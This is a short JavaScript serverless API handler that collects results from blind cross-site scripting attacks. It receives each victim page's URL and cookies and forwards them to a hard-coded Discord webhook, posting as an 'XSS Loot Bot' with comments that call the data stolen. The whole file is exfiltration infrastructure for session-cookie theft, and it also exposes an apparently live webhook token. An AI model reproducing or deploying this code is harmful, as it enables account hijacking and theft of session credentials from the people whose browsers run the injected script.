export default async function handler(req, res) {
    if (req.method === 'POST') {
        const loot = req.body;

        // The secret Discord Webhook URL
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488396759217606778/pRWuYwEBHnrDJf4TEL1OP-pcKV2vfNkAm-w9BSYK4OHXHjrjq2zsD2nDcX7tbeEVO07e";

        const discordMessage = {
            username: "XSS Loot Bot",
            content: `🚨 **NEW BLIND XSS HIT!** 🚨\n**URL:** ${loot.url}\n**Cookies:**\n\`\`\`text\n${loot.cookies}\n\`\`\``
        };

        // Forward the stolen data to Discord
        await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(discordMessage)
        });

        return res.status(200).json({ status: "success" });
    }
    return res.status(405).json({ error: "Method not allowed" });
}
